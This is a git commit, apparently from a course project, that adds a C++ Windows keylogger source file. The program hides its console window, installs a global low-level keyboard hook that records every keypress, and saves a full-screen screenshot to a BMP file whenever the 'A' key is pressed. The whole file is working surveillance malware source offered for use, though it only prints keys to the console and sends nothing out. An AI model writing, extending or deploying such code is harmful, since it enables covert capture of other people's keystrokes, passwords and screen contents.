26fdf7998f0970a3906cef45fbf8795a7d21b665
Jakub Beránek <berykubik@gmail.com>
2017-09-20 15:11:19 +0200

    initial commit

---
+++ pvbps/keylogger.cpp
@@ -0,0 +1,250 @@
+#include <Windows.h>
+#include <time.h>
+#include <iostream>
+#include <cstdio>
+#include <fstream>
+#include <d3d9.h>
+
+// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
+// or you will get problems since every function uses this variable.
+HHOOK _hook;
+
+// This struct contains the data received by the hook callback. As you see in the callback function
+// it contains the thing you will need: vkCode = virtual key code.
+KBDLLHOOKSTRUCT kbdStruct;
+
+PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp)
+{
+	BITMAP bmp;
+	PBITMAPINFO pbmi;
+	WORD    cClrBits;
+
+	// Retrieve the bitmap color format, width, and height.  
+	GetObject(hBmp, sizeof(BITMAP), (LPSTR)&bmp);
+		
+
+	// Convert the color format to a count of bits.  
+	cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
+	if (cClrBits == 1)
+		cClrBits = 1;
+	else if (cClrBits <= 4)
+		cClrBits = 4;
+	else if (cClrBits <= 8)
+		cClrBits = 8;
+	else if (cClrBits <= 16)
+		cClrBits = 16;
+	else if (cClrBits <= 24)
+		cClrBits = 24;
+	else cClrBits = 32;
+
+	// Allocate memory for the BITMAPINFO structure. (This structure  
+	// contains a BITMAPINFOHEADER structure and an array of RGBQUAD  
+	// data structures.)  
+
+	if (cClrBits < 24)
+		pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
+			sizeof(BITMAPINFOHEADER) +
+			sizeof(RGBQUAD) * (1 << cClrBits));
+
+	// There is no RGBQUAD array for these formats: 24-bit-per-pixel or 32-bit-per-pixel 
+
+	else
+		pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
+			sizeof(BITMAPINFOHEADER));
+
+	// Initialize the fields in the BITMAPINFO structure.  
+
+	pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+	pbmi->bmiHeader.biWidth = bmp.bmWidth;
+	pbmi->bmiHeader.biHeight = bmp.bmHeight;
+	pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
+	pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
+	if (cClrBits < 24)
+		pbmi->bmiHeader.biClrUsed = (1 << cClrBits);
+
+	// If the bitmap is not compressed, set the BI_RGB flag.  
+	pbmi->bmiHeader.biCompression = BI_RGB;
+
+	// Compute the number of bytes in the array of color  
+	// indices and store the result in biSizeImage.  
+	// The width must be DWORD aligned unless the bitmap is RLE 
+	// compressed. 
+	pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits + 31) & ~31) / 8
+		* pbmi->bmiHeader.biHeight;
+	// Set biClrImportant to 0, indicating that all of the  
+	// device colors are important.  
+	pbmi->bmiHeader.biClrImportant = 0;
+	return pbmi;
+}
+void CreateBMPFile(LPTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBMP)
+{
+	HANDLE hf;                 // file handle  
+	BITMAPFILEHEADER hdr;       // bitmap file-header  
+	PBITMAPINFOHEADER pbih;     // bitmap info-header  
+	LPBYTE lpBits;              // memory pointer  
+	DWORD dwTotal;              // total count of bytes  
+	DWORD cb;                   // incremental count of bytes  
+	BYTE *hp;                   // byte pointer  
+	DWORD dwTmp;
+	HDC hDC = CreateCompatibleDC(GetWindowDC(GetDesktopWindow()));
+
+	pbih = (PBITMAPINFOHEADER)pbi;
+	lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);
+
+	if (!lpBits)
+	{
+	}//errhandler("GlobalAlloc", hwnd);
+
+	// Retrieve the color table (RGBQUAD array) and the bits  
+	// (array of palette indices) from the DIB.  
+	if (!GetDIBits(hDC, hBMP, 0, (WORD)pbih->biHeight, lpBits, pbi,
+		DIB_RGB_COLORS))
+	{
+		//errhandler("GetDIBits", hwnd);
+	}
+
+	// Create the .BMP file.  
+	hf = CreateFile(pszFile,
+		GENERIC_READ | GENERIC_WRITE,
+		(DWORD)0,
+		NULL,
+		CREATE_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL,
+		(HANDLE)NULL);
+	if (hf == INVALID_HANDLE_VALUE)
+	{
+	}//errhandler("CreateFile", hwnd);
+	hdr.bfType = 0x4d42;        // 0x42 = "B" 0x4d = "M"  
+								// Compute the size of the entire file.  
+	hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) +
+		pbih->biSize + pbih->biClrUsed
+		* sizeof(RGBQUAD) + pbih->biSizeImage);
+	hdr.bfReserved1 = 0;
+	hdr.bfReserved2 = 0;
+
+	// Compute the offset to the array of color indices.  
+	hdr.bfOffBits = (DWORD) sizeof(BITMAPFILEHEADER) +
+		pbih->biSize + pbih->biClrUsed
+		* sizeof(RGBQUAD);
+
+	// Copy the BITMAPFILEHEADER into the .BMP file.  
+	if (!WriteFile(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER),
+		(LPDWORD)&dwTmp, NULL))
+	{
+		//errhandler("WriteFile", hwnd);
+	}
+
+	// Copy the BITMAPINFOHEADER and RGBQUAD array into the file.  
+	if (!WriteFile(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER)
+		+ pbih->biClrUsed * sizeof(RGBQUAD),
+		(LPDWORD)&dwTmp, (NULL)))
+	{
+	}//errhandler("WriteFile", hwnd);
+
+	// Copy the array of color indices into the .BMP file.  
+	dwTotal = cb = pbih->biSizeImage;
+	hp = lpBits;
+	if (!WriteFile(hf, (LPSTR)hp, (int)cb, (LPDWORD)&dwTmp, NULL))
+	{
+	}//errhandler("WriteFile", hwnd);
+
+	// Close the .BMP file.  
+	if (!CloseHandle(hf))
+	{
+	}//errhandler("CloseHandle", hwnd);
+
+	// Free memory.  
+	GlobalFree((HGLOBAL)lpBits);
+}
+void captureScreenshot()
+{
+	HDC hdc = GetDC(nullptr); // get the desktop device context
+	HDC hDest = CreateCompatibleDC(hdc); // create a device context to use yourself
+
+										 // get the height and width of the screen
+	int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+	int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+
+	// create a bitmap
+	HBITMAP hbDesktop = CreateCompatibleBitmap(hdc, width, height);
+
+	// use the previously created device context with the bitmap
+	SelectObject(hDest, hbDesktop);
+
+	// copy from the desktop device context to the bitmap device context
+	// call this once per 'frame'
+	BitBlt(hDest, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
+
+	// after the recording is done, release the desktop context you got..
+	ReleaseDC(nullptr, hdc);
+
+	// ..and delete the context you created
+	DeleteDC(hDest);
+
+	CreateBMPFile("test.bmp", CreateBitmapInfoStruct(hbDesktop), hbDesktop);
+}
+
+
+// This is the callback function. Consider it the event that is raised when, in this case, 
+// a key is pressed.
+LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	if (nCode >= 0)
+	{
+		// the action is valid: HC_ACTION.
+		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
+		{
+			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
+			kbdStruct = *((KBDLLHOOKSTRUCT*) lParam);
+
+			printf("%d\n", kbdStruct.vkCode);
+			printf("%d\n", kbdStruct.scanCode);
+			
+			if (kbdStruct.vkCode == 65)
+			{
+				captureScreenshot();
+			}
+		}
+	}
+
+	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
+	return CallNextHookEx(_hook, nCode, wParam, lParam);
+}
+
+void hideWindow()
+{
+	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_HIDE); // hide window
+}
+void setHook()
+{
+	// Set the hook and set it to use the callback function above
+	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
+	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
+	// function that sets and releases the hook.
+	if (!(_hook = SetWindowsHookEx(
+		WH_KEYBOARD_LL,	// low level keyboard
+		HookCallback,   // callback
+		nullptr,		// current process/dll
+		0)))			// capture all threads
+	{
+		MessageBox(nullptr, // no window
+			"Failed to install hook!",
+			"Error",
+			MB_ICONERROR);
+	}
+}
+void releaseHook()
+{
+	UnhookWindowsHookEx(_hook);
+}
+
+int main()
+{
+	hideWindow();
+	setHook();
+	atexit(releaseHook);
+
+	// event loop
+	MSG msg;
+	while (GetMessage(&msg, nullptr, 0, 0));
+}
